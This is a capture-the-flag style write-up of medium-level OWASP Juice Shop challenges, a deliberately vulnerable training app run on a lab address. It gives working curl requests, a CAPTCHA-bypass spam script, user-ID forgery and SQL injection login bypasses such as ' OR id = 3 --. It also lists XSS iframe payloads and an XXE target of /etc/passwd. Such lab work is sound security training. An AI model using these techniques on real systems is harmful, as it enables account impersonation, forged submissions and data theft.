# Level 3 - Medium Challenges

## Challenges

| Challenge | Description | Status |
| --- | --- | --- |
| Admin Registration | Get registered as admin user. | :heavy_minus_sign:
| Basket Access Tier 2 | Put an additional product into another user's shopping basket. | :heavy_minus_sign:
| [CAPTCHA Bypass Tier 1](#captcha-bypass-tier-1) | Submit 10 or more customer feedbacks within 10 seconds. | :white_check_mark:
| [Forged Feedback](#forged-feedback) | Post some feedback in another users name. | :white_check_mark:
| Forged Review | Post a product review as another user or edit any user's existing review. | :heavy_minus_sign:
| [GDPR Compliance Tier 1](#gdpr-compliance-tier-1) | Log in with Chris' erased user account. | :white_check_mark:
| Login Amy | Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note") | :heavy_minus_sign:
| [Login Bender](#login-bender) | Log in with Bender's user account. | :white_check_mark:
| [Login Jim](](#login-jim)) | Log in with Jim's user account. | :white_check_mark:
| Payback Time | Place an order that makes you rich. | :heavy_minus_sign:
| Privacy Policy Tier 2 | Prove that you actually read our privacy policy. | :heavy_minus_sign:
| Product Tampering | Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com. | :heavy_minus_sign:
| Reset Bjoern's Password Tier 1 | Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question. | :heavy_minus_sign:
| Reset Jim's Password | Reset Jim's password via the Forgot Password mechanism with the original answer to his security question. | :heavy_minus_sign:
| Upload Size | Upload a file larger than 100 kB. | :heavy_minus_sign:
| Upload Type | Upload a file that has no .pdf extension. | :heavy_minus_sign:
| XSS Tier 2 | Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` bypassing a client-side security mechanism. | :heavy_minus_sign:
| XSS Tier 3 | Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` without using the frontend application at all. | :heavy_minus_sign:
| XXE Tier 1 | Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server. (This challenge is not available on Docker!) | :heavy_minus_sign:

## Solutions

### Admin Registration

> Get registered as admin user.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:

### Basket Access Tier 2

> Put an additional product into another user's shopping basket.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### CAPTCHA Bypass Tier 1

> Submit 10 or more customer feedbacks within 10 seconds.

* Solved? :white_check_mark:
* Tools Used: Chrome, Chrome Inspector, `curl`, `jq`
* Previous Challenge Knowledge Used: [Forged Feedback (L3)](#forged-feedback)

In the [Forged Feedback](#forged-feedback) challenge, I noticed in the JSON payload that a captcha ID and answer was sent back with the request, but also in that challenge, I noticed that there is a captcha endpoint that they are calling to get the text and also its answers.

<img src="images/3-captcha-bypass-request.png">

I tested hitting that endpoint, and it doesn't look like it requires any authorization or anything.

```bash
$ curl -s 'http://172.16.189.131:3000/rest/captcha/'
{"captchaId":4,"captcha":"1-1+2","answer":"2"}
```

From this, we can use `jq` to parse out the answer and the ID.

```bash
$ CAPTCHA=$(curl -s 'http://172.16.189.131:3000/rest/captcha/')
$ echo $CAPTCHA | jq
{
  "captchaId": 5,
  "captcha": "2-9*9",
  "answer": "-79"
}
$ echo $CAPTCHA | jq '.captchaId'
5
$ echo $CAPTCHA | jq '.answer'
"-79"
```

Now, we can create a [simple `bash` script](files/3-captcha-bypass.sh) that will run, lets say, 12 requests as fast as possible. It will first grab the answer from the captcha endpoint, and use it in each payload.

```bash
$ level-3/files/3-captcha-bypass.sh
Sending Payload: {"UserId":15,"captchaId":12,"captcha":"1","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":13,"captcha":"-33","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":14,"captcha":"36","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":15,"captcha":"6","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":16,"captcha":"22","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":17,"captcha":"2","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":18,"captcha":"90","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":19,"captcha":"17","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":20,"captcha":"-2","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":21,"captcha":"7","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":22,"captcha":"7","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
Sending Payload: {"UserId":15,"captchaId":23,"captcha":"96","comment":"SPAM TIME!","rating":1}
HTTP/1.1 201 Created
```

Now, we can spam the store with feedback! Solved!

<img src="images/3-captcha-bypass-solved.png">

### Forged Feedback

> Post some feedback in another users name.

* Solved? :white_check_mark:
* Tools Used: Chrome, Chrome Inspector, curl
* Previous Challenge Knowledge Used: [Zero Stars (L1)](../level-1#zero-stars)

Using the same method, I used in [Zero Stars](../level-1#zero-stars) in level 1, I made a regular request on the feedback page with Chrome Inspector open to the network tab.

<img src="images/3-forged-feedback-request.png">

From there, I copied the request as a `curl` command and pasted it into my terminal. Note that my user ID was `15`, and in my JSON payload, I switched my ID from a `15` to a `1`.

```bash
$ curl 'http://172.16.189.131:3000/api/Feedbacks/' --data-binary '{"UserId":1,"captchaId":6,"captcha":"22","comment":"Not Legit","rating":1}' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV0aGluZy5pbyIsInBhc3N3b3JkIjoiYjQ0NDg3NjJmYzg3N2MyZDU3YjJjOTcyMzExOGQyNjQiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTUgMjI6NDE6MTguMDk2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTUgMjI6NDE6MTguMDk2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTkwODg4MiwiZXhwIjoxNTY1OTI2ODgyfQ.zY86bOzxeSg8pKneqBVZx9nf5-B6ajtdalqvpd5nFKjL1CO7ZkJvHn0FmXOeZsauyrnImA582zJiUaQE1yG_9KeUezWVrqV_rF9iqmK9uFNHMI8uzqYPz-B66yUHzf7E9o2NFrgaAneKAckdGF-R8WY99Es1KyWDfNscozUU1ao'
{"status":"success","data":{"id":13,"UserId":1,"comment":"Not Legit","rating":1,"updatedAt":"2019-08-15T22:46:26.330Z","createdAt":"2019-08-15T22:46:26.330Z"}}
```

And they are not checking if I am the user I say I am before they add the feedback. Look like this is solved!

<img src="images/3-forged-feedback-solved.png">

### Forged Review

> Post a product review as another user or edit any user's existing review.

* Solved? :heavy_minus_sign:
* Tools Used: Chrome, Chrome Inspector, curl
* Previous Challenge Knowledge Used: [Forged Feedback (L3)](#forged-feedback)




### GDPR Compliance Tier 1

> Log in with Chris' erased user account.

* Solved? :white_check_mark:
* Tools Used: Chrome, Chrome Inspector
* Previous Challenge Knowledge Used: [Login Admin (L2)](../level-2#login-admin)

So, quick note, the challenge kind of gave me a hint maybe, as it was telling me the name of the users to log in as, but that's probably okay. Anyways, first I tried using the SQL injection vulnerability found in the [Login Admin](../level-2#login-admin) challenge in level 2, and tried looking for either an email or a name with that. Quick note, I don't actually know the schema, but I can infer a few things from the users API call from the [Login Bender](#login-bender) challenge based on the JSON attributes. The `name` attribute isn't part of the data returned, but I might as well try it out.

```sql
' OR name like '%Chris%' OR email like '%chris%' --
```

And after I try that, I get this error, with the full error object being output to the console.

<img src="images/3-login-chris-error.png">

Oh, that's nice - for me! That might be useful later, but for now, all I need to do is remove the `name like '%Chris%'` from the SQL injection, and see what happens. And once I did that, I was now impersonating Chris!

Another neat thing I found logged in as Chris - I couldn't access the user profile settings at all, and was getting a big stack trace. Also putting that in my back pocket for now.

Solved!

<img src="images/3-login-chris-solved.png">

### Login Amy

> Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### Login Bender

> Log in with Bender's user account.

* Solved? :white_check_mark:
* Tools Used: Chrome, curl
* Previous Challenge Knowledge Used: [Login Admin (L2)](../level-2#login-admin)

So, in level 2, I ended up finding that the Users API endpoint required an authentication token in the header, but was not checking if the token's user had the proper authorization to access the user endpoint (or they thought that it didn't need authorization or something). Anyways, doing a basic `curl` command to the users endpoint with an `Authorization` header resulted in the following:

<img src="images/3-login-bender-users-api.png">

Using the SQL injection vulnerability found in the [Login Admin](../level-2#login-admin) challenge in level 2,  I was able to create a SQL injection that allowed me to login as Bender.

```sql
' OR id = 3 --
```

And voila! Solved!

<img src="images/3-login-bender-solved.png">

### Login Jim

> Log in with Jim's user account.

* Solved? :white_check_mark:
* Tools Used: Chrome, curl
* Previous Challenge Knowledge Used: [Login Bender (L3)](#login-bender)

Literally justed used the same steps as the previous challenge, [Login Bender](#login-bender), except I used the user ID `2` in the SQL injection string.

```sql
' OR id = 2 --
```

Solved!

<img src="images/3-login-jim-solved.png">

### Payback Time

> Place an order that makes you rich.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### Privacy Policy Tier 2

> Prove that you actually read our privacy policy.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### Product Tampering

> Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### Reset Bjoern's Password Tier 1

> Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### Reset Jim's Password

> Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### Upload Size

> Upload a file larger than 100 kB.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### Upload Type

> Upload a file that has no .pdf extension.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### XSS Tier 2

> Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` bypassing a client-side security mechanism.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### XSS Tier 3

> Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` without using the frontend application at all.

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


### XXE Tier 1

> Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server. (This challenge is not available on Docker!)

* Solved? :heavy_minus_sign:
* Tools Used: :heavy_minus_sign:


